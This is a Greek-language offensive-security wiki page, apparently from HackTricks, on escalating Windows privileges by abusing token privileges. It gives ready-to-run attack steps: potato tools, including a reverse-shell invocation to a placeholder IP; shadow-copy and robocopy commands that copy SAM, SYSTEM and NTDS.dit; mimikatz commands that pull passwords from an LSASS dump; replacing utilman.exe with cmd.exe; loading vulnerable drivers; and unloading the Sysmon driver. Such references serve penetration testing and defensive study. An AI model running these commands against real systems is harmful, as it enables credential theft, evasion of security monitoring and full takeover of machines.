# Abusing Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Αν **δεν γνωρίζεις τι είναι τα Windows Access Tokens**, διάβασε αυτή τη σελίδα πριν συνεχίσεις:


{{#ref}}
access-tokens.md
{{#endref}}

**Ίσως μπορέσεις να κάνεις privilege escalation κάνοντας abuse σε tokens που ήδη έχεις στην κατοχή σου.**

### SeImpersonatePrivilege

Αυτό το privilege επιτρέπει σε ένα process να κάνει impersonate ένα token, αλλά όχι να δημιουργήσει token, όταν μπορεί να αποκτήσει handle σε αυτό το token. Ένα privileged token μπορεί να αποκτηθεί από ένα Windows service (DCOM), προκαλώντας το να εκτελέσει NTLM authentication προς ένα exploit και, στη συνέχεια, επιτρέποντας την εκτέλεση ενός process με SYSTEM privileges.<sup>[[2]](#references)</sup> Αυτό το primitive μπορεί να γίνει exploit με εργαλεία όπως τα [JuicyPotato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (το οποίο απαιτεί να είναι απενεργοποιημένο το WinRM), [SweetPotato](https://github.com/CCob/SweetPotato) και [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Σημειώσεις για σύγχρονους operators:

- **Το JuicyPotato είναι legacy**: σε Windows 10 1809+/Server 2019+, προτίμησε τα **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** ή **PrintSpoofer**, ανάλογα με το ποια επιφάνεια RPC/COM παραμένει προσβάσιμη.
- Αν έχεις κάνει compromise σε ένα service που εκτελείται ως **`LOCAL SERVICE`** ή **`NETWORK SERVICE`** και το `whoami /priv` εμφανίζει ένα **filtered token** χωρίς `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, ανάκτησε πρώτα το **default privilege set** του account (για παράδειγμα με το **FullPowers**) και έπειτα δοκίμασε ξανά την potato family.<sup>[[3]](#references)</sup>
- Ορισμένα νεότερα forks είναι πιο φιλικά προς τους operators από τα αρχικά εργαλεία. Για παράδειγμα, το **SigmaPotato** προσθέτει reflection/in-memory execution και συμβατότητα με σύγχρονα Windows, ενώ το **PrintNotifyPotato** κάνει abuse στο PrintNotify COM service και είναι συχνά χρήσιμο όταν η κλασική διαδρομή του Spooler είναι απενεργοποιημένη.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Είναι πολύ παρόμοιο με το **SeImpersonatePrivilege**· θα χρησιμοποιήσει την **ίδια μέθοδο** για να αποκτήσει ένα privileged token.\
Στη συνέχεια, αυτό το privilege επιτρέπει την **ανάθεση ενός primary token** σε μια νέα/ανασταλμένη διεργασία. Με το privileged impersonation token μπορείτε να παράγετε ένα primary token (DuplicateTokenEx).\
Με το token, μπορείτε να δημιουργήσετε μια **νέα διεργασία** με το 'CreateProcessAsUser' ή να δημιουργήσετε μια διεργασία σε αναστολή και να **ορίσετε το token** (γενικά, δεν μπορείτε να τροποποιήσετε το primary token μιας εκτελούμενης διεργασίας).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

Αν έχετε ενεργοποιήσει αυτό το token, μπορείτε να χρησιμοποιήσετε το **KERB_S4U_LOGON** για να αποκτήσετε ένα **impersonation token** για οποιονδήποτε άλλο χρήστη χωρίς να γνωρίζετε τα credentials, να **προσθέσετε μια αυθαίρετη ομάδα** (admins) στο token, να ορίσετε το **integrity level** του token σε "**medium**" και να αντιστοιχίσετε αυτό το token στο **τρέχον thread** (SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

Αυτό το privilege υποχρεώνει το σύστημα να **χορηγεί πλήρη read access** σε οποιοδήποτε αρχείο (με περιορισμό στις λειτουργίες ανάγνωσης). Χρησιμοποιείται για την **ανάγνωση των password hashes των local Administrator** accounts από το registry, και στη συνέχεια εργαλεία όπως τα "**psexec**" ή "**wmiexec**" μπορούν να χρησιμοποιηθούν με το hash (τεχνική Pass-the-Hash). Ωστόσο, αυτή η τεχνική αποτυγχάνει υπό δύο συνθήκες: όταν το Local Administrator account είναι απενεργοποιημένο ή όταν υπάρχει policy που αφαιρεί τα administrative rights από Local Administrators που συνδέονται remotely.<sup>[[2]](#references)</sup>\
Στην πράξη, η πιο αξιόπιστη ενσωματωμένη διαδικασία είναι συνήθως **VSS + `robocopy /b`**: δημιουργήστε/εκθέστε ένα shadow copy και, στη συνέχεια, αντιγράψτε τα `SAM`/`SYSTEM` ή το `NTDS.dit` σε **backup mode**, παρακάμπτοντας τα file ACLs.<sup>[[4]](#references)</sup>
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
Μπορείτε να **abuse αυτό το privilege** με:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- ακολουθώντας το **IppSec** στο [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Ή όπως εξηγείται στην ενότητα **escalating privileges with Backup Operators** του:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Αυτό το privilege παρέχει **write access** σε οποιοδήποτε system file, ανεξάρτητα από το Access Control List (ACL) του αρχείου. Ανοίγει πολλές δυνατότητες για escalation, συμπεριλαμβανομένης της δυνατότητας **τροποποίησης services**, εκτέλεσης DLL Hijacking και ορισμού **debuggers** μέσω των Image File Execution Options, μεταξύ διαφόρων άλλων τεχνικών.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

Το SeCreateTokenPrivilege είναι ένα ισχυρό permission, ιδιαίτερα χρήσιμο όταν ένας user διαθέτει τη δυνατότητα impersonate tokens, αλλά και όταν απουσιάζει το SeImpersonatePrivilege. Αυτή η δυνατότητα εξαρτάται από την ικανότητα impersonate ενός token που αντιπροσωπεύει τον ίδιο user και του οποίου το integrity level δεν υπερβαίνει εκείνο του τρέχοντος process.<sup>[[2]](#references)</sup>

**Βασικά σημεία:**

- **Impersonation χωρίς SeImpersonatePrivilege:** Είναι δυνατή η αξιοποίηση του SeCreateTokenPrivilege για EoP μέσω impersonation tokens υπό συγκεκριμένες προϋποθέσεις.
- **Προϋποθέσεις για Token Impersonation:** Για επιτυχημένο impersonation, το target token πρέπει να ανήκει στον ίδιο user και να έχει integrity level μικρότερο ή ίσο με το integrity level του process που επιχειρεί το impersonation.
- **Δημιουργία και τροποποίηση Impersonation Tokens:** Οι users μπορούν να δημιουργήσουν ένα impersonation token και να το ενισχύσουν προσθέτοντας το SID (Security Identifier) ενός privileged group.

### SeLoadDriverPrivilege

Αυτό το privilege επιτρέπει σε ένα process να **φορτώνει και να εκφορτώνει device drivers**, δημιουργώντας ένα registry entry με συγκεκριμένες τιμές `ImagePath` και `Type`. Επειδή η άμεση write access στο `HKLM` (HKEY_LOCAL_MACHINE) είναι περιορισμένη, μπορεί να χρησιμοποιηθεί το `HKCU` (HKEY_CURRENT_USER). Ωστόσο, απαιτείται συγκεκριμένο path ώστε το `HKCU` entry να αναγνωρίζεται από τον kernel ως driver configuration.<sup>[[2]](#references)</sup>

Η σύγχρονη offensive χρήση είναι συνήθως **BYOVD** (bring your own vulnerable driver): φορτώνεται ένας **signed but vulnerable** kernel driver και στη συνέχεια χρησιμοποιούνται τα IOCTLs του για την απενεργοποίηση protections ή τη μετάβαση σε kernel code execution. Έχετε υπόψη ότι σε πρόσφατα Windows 11/Server builds, το **Microsoft vulnerable driver blocklist** και/ή το **HVCI/Memory Integrity** συχνά εμποδίζουν παλαιότερες public chains, επομένως τα κλασικά παραδείγματα τύπου `szkg64.sys` δεν είναι πλέον αξιόπιστα σε όλες τις περιπτώσεις.

Αυτό το path είναι `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, όπου το `<RID>` είναι το Relative Identifier του τρέχοντος user. Μέσα στο `HKCU`, πρέπει να δημιουργηθεί ολόκληρο αυτό το path και να οριστούν δύο values:<sup>[[2]](#references)</sup>

- `ImagePath`, δηλαδή το path προς το binary που θα εκτελεστεί
- `Type`, με τιμή `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Βήματα:**

1. Αποκτήστε πρόσβαση στο `HKCU` αντί για το `HKLM`, λόγω περιορισμένης write access.
2. Δημιουργήστε το path `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` μέσα στο `HKCU`, όπου το `<RID>` αντιπροσωπεύει το Relative Identifier του τρέχοντος user.
3. Ορίστε το `ImagePath` στο path εκτέλεσης του binary.
4. Ορίστε το `Type` ως `SERVICE_KERNEL_DRIVER` (`0x00000001`).
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Περισσότεροι τρόποι κατάχρησης αυτού του privilege στο [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Αυτό είναι παρόμοιο με το **SeRestorePrivilege**. Η κύρια λειτουργία του επιτρέπει σε μια διεργασία να **αναλάβει την ιδιοκτησία ενός αντικειμένου**, παρακάμπτοντας την απαίτηση για ρητή διακριτική πρόσβαση μέσω της παροχής δικαιωμάτων πρόσβασης WRITE_OWNER. Η διαδικασία περιλαμβάνει αρχικά την εξασφάλιση της ιδιοκτησίας του επιθυμητού registry key για σκοπούς εγγραφής και, στη συνέχεια, την τροποποίηση του DACL ώστε να ενεργοποιηθούν οι λειτουργίες εγγραφής.<sup>[[2]](#references)</sup>
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

Αυτό το privilege επιτρέπει το **debug σε άλλες διεργασίες**, συμπεριλαμβανομένης της ανάγνωσης και εγγραφής στη μνήμη. Με αυτό το privilege μπορούν να χρησιμοποιηθούν διάφορες στρατηγικές για memory injection, οι οποίες είναι ικανές να παρακάμπτουν τις περισσότερες λύσεις antivirus και host intrusion prevention.<sup>[[2]](#references)</sup>

Στα σύγχρονα Windows, θυμηθείτε ότι το `SeDebugPrivilege` είναι συνήθως αρκετό για το άνοιγμα **μη προστατευμένων SYSTEM διεργασιών** και την αντιγραφή των token τους, αλλά **δεν εγγυάται** ότι μπορείτε να αποκτήσετε πρόσβαση στο **LSASS**. Αν είναι ενεργοποιημένο το **RunAsPPL / LSA Protection**, οι μη προστατευμένες διεργασίες δεν μπορούν να διαβάσουν ή να κάνουν injection στο LSASS, ακόμη και όταν υπάρχει το `SeDebugPrivilege`. Σε αυτή την περίπτωση, κλέψτε ένα token από κάποια άλλη μη-PPL SYSTEM διεργασία ή χρησιμοποιήστε chain με PPL bypass/BYOVD, αντί να θεωρήσετε δεδομένο ότι το `procdump` θα λειτουργήσει. Για ένα πλήρες παράδειγμα αντιγραφής token με χρήση των `SeDebugPrivilege` + `SeImpersonatePrivilege`, δείτε [αυτή τη σελίδα](sedebug-+-seimpersonate-copy-token.md).

#### Dump memory

Μπορείτε να χρησιμοποιήσετε το [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) από το [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) για να **καταγράψετε τη μνήμη μιας διεργασίας**. Συγκεκριμένα, αυτό μπορεί να εφαρμοστεί στη διεργασία **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, η οποία είναι υπεύθυνη για την αποθήκευση των credentials των χρηστών αφού ένας χρήστης συνδεθεί επιτυχώς σε ένα σύστημα.

Στη συνέχεια, μπορείτε να φορτώσετε αυτό το dump στο mimikatz για να αποκτήσετε passwords:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

Αν θέλετε να αποκτήσετε ένα `NT SYSTEM` shell, μπορείτε να χρησιμοποιήσετε:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

Αυτό το δικαίωμα (Perform volume maintenance tasks) επιτρέπει το άνοιγμα raw volume device handles (π.χ. \\.\C:) για άμεσο disk I/O που παρακάμπτει τα NTFS ACLs. Με αυτό μπορείτε να αντιγράψετε bytes οποιουδήποτε αρχείου στον τόμο διαβάζοντας τα υποκείμενα blocks, επιτρέποντας arbitrary file read ευαίσθητου υλικού (π.χ. machine private keys στο %ProgramData%\Microsoft\Crypto\, registry hives, SAM/NTDS μέσω VSS).<sup>[[5]](#references)</sup> Είναι ιδιαίτερα σημαντικό σε CA servers, όπου η exfiltration του CA private key επιτρέπει τη δημιουργία ενός Golden Certificate για την impersonation οποιουδήποτε principal.<sup>[[6]](#references)</sup>

Δείτε αναλυτικές τεχνικές και mitigations:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Check privileges
```
whoami /priv
```
Τα **tokens που εμφανίζονται ως Disabled** μπορούν συνήθως να ενεργοποιηθούν, επομένως συχνά μπορείτε να κάνετε abuse τόσο σε _Enabled_ όσο και σε _Disabled_ privileges.

### Ενεργοποίηση όλων των tokens

Αν έχετε disabled privileges, μπορείτε να χρησιμοποιήσετε το script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) για να ενεργοποιήσετε όλα τα tokens:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Ή το **script** που είναι ενσωματωμένο σε αυτή την [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Table

Πλήρες cheatsheet για τα token privileges στο [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), ενώ η παρακάτω σύνοψη παραθέτει μόνο άμεσους τρόπους εκμετάλλευσης του privilege για την απόκτηση μιας admin session ή την ανάγνωση ευαίσθητων αρχείων.<sup>[[1]](#references)</sup>

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"Θα επέτρεπε σε έναν χρήστη να κάνει impersonate tokens και να πραγματοποιήσει privesc σε nt system χρησιμοποιώντας tools όπως τα potato.exe, rottenpotato.exe και juicypotato.exe"_                                                                                                                                                                                                      | Ευχαριστώ τον [Aurélien Chalot](https://twitter.com/Defte_) για την ενημέρωση. Θα προσπαθήσω σύντομα να το διατυπώσω ξανά σε μορφή recipe.                                                                                                                                                                                         |
| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | Ανάγνωση ευαίσθητων αρχείων με `robocopy /b` ή με dedicated SeBackup-aware copy helpers.                                                                                                                                                                                                                                                                 | <p>- Ιδιαίτερα χρήσιμο για τα `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit` και, ορισμένες φορές, το `%WINDIR%\MEMORY.DMP`.<br><br>- Το `robocopy` είναι βολικό, αλλά τα dedicated SeBackup cmdlets/APIs είναι συχνά πιο ευέλικτα για locked/open files.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | Δημιουργία αυθαίρετου token που περιλαμβάνει local admin rights με το `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Αντιγραφή ενός **non-PPL** SYSTEM token ή dump της μνήμης από ένα non-protected process.                                                                                                                                                                                                                                                                 | <p>Το LSASS dumping συνήθως αποκλείεται αν είναι ενεργοποιημένο το RunAsPPL/LSA Protection.</p><p>Το script βρίσκεται στο [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | Χρήση της **Potato family** / named-pipe impersonation για τη δημιουργία SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, κ.λπ.).                                                                                                                                                                                    | <p>Πιο πρακτικό από service accounts όπως IIS APPPOOL, MSSQL, scheduled tasks ή οποιοδήποτε context διαθέτει ήδη το `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. Φόρτωση ενός signed-but-vulnerable kernel driver (BYOVD)<br>2. Χρήση των IOCTLs του driver για απόκτηση kernel R/W, απενεργοποίηση security tooling ή privilege escalation σε SYSTEM<br><br>Εναλλακτικά, το privilege μπορεί να χρησιμοποιηθεί για την εκφόρτωση security-related drivers με την builtin command <code>fltMC</code>, δηλαδή <code>fltMC sysmondrv</code></p>                     | <p>Παλαιότεροι public drivers, όπως ο <code>szkg64.sys</code>, αποκλείονται ολοένα και περισσότερο στα σύγχρονα Windows από τη vulnerable-driver blocklist / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Εκκίνηση του PowerShell/ISE με ενεργό το SeRestore privilege.<br>2. Ενεργοποίηση του privilege με το <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Μετονομασία του utilman.exe σε utilman.old<br>4. Μετονομασία του cmd.exe σε utilman.exe<br>5. Κλείδωμα της console και πάτημα των Win+U</p> | <p>Η επίθεση μπορεί να ανιχνευθεί από ορισμένα AV software.</p><p>Εναλλακτική μέθοδος βασίζεται στην αντικατάσταση service binaries που είναι αποθηκευμένα στο "Program Files" με χρήση του ίδιου privilege</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Μετονομασία του cmd.exe σε utilman.exe<br>4. Κλείδωμα της console και πάτημα των Win+U</p>                                                                                                                                       | <p>Η επίθεση μπορεί να ανιχνευθεί από ορισμένα AV software.</p><p>Εναλλακτική μέθοδος βασίζεται στην αντικατάσταση service binaries που είναι αποθηκευμένα στο "Program Files" με χρήση του ίδιου privilege.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>Χειρισμός tokens ώστε να περιλαμβάνουν local admin rights. Ενδέχεται να απαιτείται SeImpersonate.</p><p>Πρέπει να επαληθευτεί.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin - paths εκμετάλλευσης από Windows privileges σε admin](https://github.com/gtworek/Priv2Admin)
- [2] [Abusing Token Privileges For LPE](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – Give Me Back My Privileges! Please?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (`/b` backup mode παρακάμπτει τους ελέγχους ACL αρχείων/φακέλων)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – Εκτέλεση εργασιών συντήρησης volume (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
{{#include ../../banners/hacktricks-training.md}}
